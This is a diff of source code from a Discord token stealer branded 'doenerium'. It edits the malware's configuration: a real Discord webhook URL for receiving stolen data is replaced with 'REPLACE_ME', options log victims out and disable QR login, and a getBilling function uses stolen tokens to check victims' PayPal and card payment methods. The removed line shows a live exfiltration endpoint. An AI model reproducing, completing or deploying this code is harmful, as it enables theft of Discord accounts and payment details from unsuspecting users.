@@ -8,12 +8,12 @@ const querystring = require("querystring");
 const fs = require("fs");
 
 
-// Initilization
+// Initialization
 
 var config = {
     brand: "doenerium",
 
-    webhook: "https://ptb.discord.com/api/webhooks/1205795991706538034/lH4bdwFnMtCPsrawcihna4dw7stM88t_f4onZN7XOn4fGvPGXDzLkptphAdDfjH2Xp7I",
+    webhook: "REPLACE_ME",
 
     logout: true,
     disable_qr_code: true,
@@ -23,12 +23,12 @@ var config = {
     ping: [true, "@doener"],
 
     embed: {
-        username: "discord.gg/9GfN3UP3TJ",
+        username: "Can",
         footer: {
-            text: `discord.gg/9GfN3UP3TJ`,
+            text: `Can`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "discord.gg/9GfN3UP3TJ",
+        href: "Can",
         avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
@@ -609,17 +609,17 @@ async function getBilling(token) {
     var billing = "";
     json.forEach(z => {
         if (z.type == "") {
-            return "\`\`\`?\`\`\`";
+            return "\`\`\`❌\`\`\`";
         } else if (z.type == 2 && z.invalid != true) {
-            billing += "\`??\`" + " <:paypal:896441236062347374>";
+            billing += "\`✔️\`" + " <:paypal:896441236062347374>";
         } else if (z.type == 1 && z.invalid != true) {
-            billing += "\`??\`" + " :credit_card:";
+            billing += "\`✔️\`" + " :credit_card:";
         } else {
-            return "\`\`\`?\`\`\`";
+            return "\`\`\`❌\`\`\`";
         };
     });
 
-    if (billing == "") billing = "\`\`\`?\`\`\`"
+    if (billing == "") billing = "\`\`\`❌\`\`\`"
     return billing;
 }
 
